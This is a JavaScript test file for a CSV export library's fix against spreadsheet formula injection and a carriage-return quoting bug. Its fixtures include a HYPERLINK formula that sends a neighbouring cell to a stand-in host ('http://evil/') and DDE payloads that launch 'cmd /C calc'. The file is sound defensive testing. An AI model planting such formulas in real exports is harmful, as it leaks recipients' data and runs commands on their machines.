// tests/compliance/csv-formula-injection.test.mjs
//
// Two P1s in the same twenty lines of the one function that writes every list the pack
// produces, plus the disagreement that made them hard to see.
//
//   F1  CSV formula injection. `writeOutputList` and the shared `escapeField` both
//       quoted a value and stopped there. Quoting is CSV syntax; a spreadsheet
//       evaluates the field AFTER unquoting it. An attacker who sets their own
//       LinkedIn company name to `=HYPERLINK("http://evil/"&A1,"x")` gets it enriched
//       into a rep's ICP list (enrich_profile -> mapResponse currentCompany ->
//       company_name -> gtm/lists/*.csv). /crm-export exists so a human then OPENS
//       that file in Excel, Sheets, HubSpot or Salesforce — and the formula
//       exfiltrates the adjacent cell, a colleague's work email, to the attacker's
//       host. No LLM cooperation and no operator mistake anywhere in the chain.
//       _lib/sender-export.mjs uses the same writer, so ad-platform exports carried it.
//
//   F15 The two escapers disagreed about CR: csv.escapeField quoted /[",\n\r]/,
//       writeOutputList's private copy quoted /[",\n]/. Excel and most CRM importers
//       treat a lone CR as a row break, so the writer split one record into two while
//       the shared helper did not. There is now one escaper and no private copy.
//
// Every test here fails if the old behaviour returns.

import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { tmpRoot, cleanupTmp } from './helpers.mjs';
import { ensureGtmTree } from '../../_lib/pii.mjs';
import { escapeField, neutraliseFormula, parseRows, parseCsv, stringifyRows } from '../../_lib/csv.mjs';
import { writeOutputList, ensureSuppressionStore } from '../../_lib/suppression.mjs';

test.after(cleanupTmp);

function seeded(prefix = 'compliance-csvinj-') {
  const root = tmpRoot(prefix);
  ensureGtmTree(root);
  ensureSuppressionStore(root);
  writeFileSync(join(root, 'gtm', 'suppression.jsonl'), '', 'utf8');
  return root;
}

// The exact payload from the audit, and the four other lead characters a spreadsheet
// evaluates. TAB and CR lead because Excel strips leading whitespace before deciding.
const EXFIL = '=HYPERLINK("http://evil/"&A1,"x")';
const HOSTILE = [
  EXFIL,
  '+HYPERLINK("http://evil/","x")',
  '-2+3+cmd|\' /C calc\'!A0',
  '@SUM(1+9)*cmd|\' /C calc\'!A0',
  '\t=1+1',
  '\r=1+1',
];

// --- the shared helper -----------------------------------------------------

test('escapeField neutralises every spreadsheet lead character', () => {
  for (const payload of HOSTILE) {
    const field = escapeField(payload);
    // Strip CSV quoting the way a reader does, then look at what the cell CONTAINS.
    const cell = field.startsWith('"') ? field.slice(1, -1).replace(/""/g, '"') : field;
    assert.equal(cell[0], "'",
      `escapeField left a live formula lead on ${JSON.stringify(payload)} -> ${JSON.stringify(field)}`);
    assert.equal(cell.slice(1), payload, 'the payload must survive verbatim behind the marker');
  }
});

test('the audit payload is inert in the shared helper', () => {
  assert.equal(escapeField(EXFIL), `"'=HYPERLINK(""http://evil/""&A1,""x"")"`);
});

test('ordinary values are untouched', () => {
  for (const v of ['Acme Corp', 'ada@acme.com', 'https://acme.com', '42', '0', 'CTO',
                   'Smith, Ada', 'a"b', '', 'Zürich']) {
    assert.equal(neutraliseFormula(v), v, `neutraliseFormula altered ${JSON.stringify(v)}`);
  }
  assert.equal(escapeField('Acme Corp'), 'Acme Corp');
  assert.equal(escapeField(null), '');
  assert.equal(escapeField(undefined), '');
});

// --- the negative-number decision ------------------------------------------

test('a negative number stays a number — a fully numeric literal is exempt', () => {
  for (const n of ['-42', '-3.14', '-.5', '-1.2e-3', '-0', '+42', '+1.5']) {
    assert.equal(escapeField(n), n, `${n} was turned into text and broke every downstream SUM`);
  }
});

test('the numeric exemption does not become a bypass — it must match the WHOLE string', () => {
  for (const payload of ['-1+A1', '-2+3+cmd|\' /C calc\'!A0', '-1-HYPERLINK("http://evil/","x")',
                         '+1+A1', '-1 ', '-42=A1']) {
    const field = escapeField(payload);
    const cell = field.startsWith('"') ? field.slice(1, -1).replace(/""/g, '"') : field;
    assert.equal(cell[0], "'", `numeric exemption leaked a formula: ${JSON.stringify(payload)}`);
  }
});

// --- the round-trip decision -----------------------------------------------

test('write -> parseRows -> write is idempotent: the marker never accumulates', () => {
  const rows = [['company_name'], [EXFIL], ['-42'], ['plain']];
  let text = stringifyRows(rows);
  for (let i = 0; i < 5; i += 1) {
    const back = parseRows(text.replace(/\n$/, ''));
    assert.equal(back[1][0], `'${EXFIL}`, 'pass ' + i + ': the marker changed shape');
    assert.ok(!back[1][0].startsWith("''"), 'pass ' + i + ": the apostrophe accumulated ('')");
    assert.equal(back[2][0], '-42', 'pass ' + i + ': the negative number was rewritten');
    text = stringifyRows(back);
  }
});

test('a value already carrying the marker is left alone', () => {
  assert.equal(neutraliseFormula("'=1+1"), "'=1+1");
  assert.equal(neutraliseFormula("'-42"), "'-42");
  // and an apostrophe in front of something harmless is not a marker, so it is not
  // special-cased either
  assert.equal(neutraliseFormula("O'Brien"), "O'Brien");
});

// --- the real writer -------------------------------------------------------

test('writeOutputList does not write a live formula — the audit payload, end to end', () => {
  const root = seeded();
  const out = join(root, 'gtm', 'lists', 'icp.csv');
  writeOutputList(out, [
    { company_name: EXFIL, work_email: 'colleague@corp.example' },
  ], { root });
  const bytes = readFileSync(out, 'utf8');

  assert.ok(!/(^|,)"?=HYPERLINK/.test(bytes),
    `the writer emitted a live formula:\n${bytes}`);
  assert.ok(bytes.includes(`"'=HYPERLINK`), `expected a neutralised cell, got:\n${bytes}`);

  // and the file is still valid CSV that the pack's own reader round-trips
  const back = parseCsv(bytes);
  assert.equal(back.length, 1);
  assert.equal(back[0].company_name, `'${EXFIL}`);
  assert.equal(back[0].work_email, 'colleague@corp.example');
});

test('writeOutputList neutralises every lead character, in every column', () => {
  const root = seeded();
  const out = join(root, 'gtm', 'lists', 'hostile.csv');
  writeOutputList(out, HOSTILE.map((p, i) => ({ company_name: p, n: String(i) })), { root });
  const back = parseCsv(readFileSync(out, 'utf8'));
  assert.equal(back.length, HOSTILE.length);
  back.forEach((r, i) => {
    // parseCsv trims, so compare on the trimmed payload.
    assert.equal(r.company_name[0], "'",
      `row ${i} kept a live lead: ${JSON.stringify(r.company_name)}`);
  });
});

test('a hostile COLUMN NAME is neutralised too — in pages mode the keys are raw API JSON', () => {
  const root = seeded();
  const out = join(root, 'gtm', 'lists', 'hdr.csv');
  writeOutputList(out, [{ [EXFIL]: 'x' }], { root });
  const bytes = readFileSync(out, 'utf8');
  assert.ok(!/^"?=HYPERLINK/.test(bytes), `the header row is a live formula:\n${bytes}`);
  assert.ok(bytes.startsWith(`"'=HYPERLINK`), bytes);
});

// --- finding 15: one escaper, one opinion about CR -------------------------

test('the writer and the shared helper agree about a bare CR', () => {
  const root = seeded();
  const out = join(root, 'gtm', 'lists', 'cr.csv');
  writeOutputList(out, [{ note: 'a\rb', email: 'ada@acme.com' }], { root });
  const bytes = readFileSync(out, 'utf8');

  assert.ok(bytes.includes('"a\rb"'),
    `a bare CR was written unquoted — Excel splits that record in two:\n${JSON.stringify(bytes)}`);
  assert.equal(escapeField('a\rb'), '"a\rb"', 'the shared helper must agree');

  // one record in, one record out
  const back = parseCsv(bytes);
  assert.equal(back.length, 1, 'the CR split one record into two');
  assert.equal(back[0].email, 'ada@acme.com');
});

test('writeOutputList keeps no private escaper — there is one implementation', () => {
  const src = readFileSync(new URL('../../_lib/suppression.mjs', import.meta.url), 'utf8');
  assert.match(src, /import \{ escapeField \} from '\.\/csv\.mjs'/,
    'suppression.mjs must use the shared escaper');
  // Comments name the old rule on purpose; only CODE may not re-declare it.
  const code = src.split('\n').filter(l => !/^\s*(\/\/|\*|\/\*)/.test(l)).join('\n');
  assert.ok(!/const esc\b/.test(code),
    'the private copy of the escaper is back — that is how the two drifted apart');
  assert.ok(!/\.test\(str\)\s*\?/.test(code),
    'a second quoting rule is back in suppression.mjs');
  assert.match(code, /cols\.map\(escapeField\)/, 'header cells must go through the shared escaper');
});

test('embedded newlines and quotes still round-trip (the erase learning holds)', () => {
  const root = seeded();
  const out = join(root, 'gtm', 'lists', 'multiline.csv');
  writeOutputList(out, [{ note: 'line1\nline2', name: 'Ada "The" Lovelace' }], { root });
  const back = parseCsv(readFileSync(out, 'utf8'));
  assert.equal(back.length, 1);
  assert.equal(back[0].note, 'line1\nline2');
  assert.equal(back[0].name, 'Ada "The" Lovelace');
});
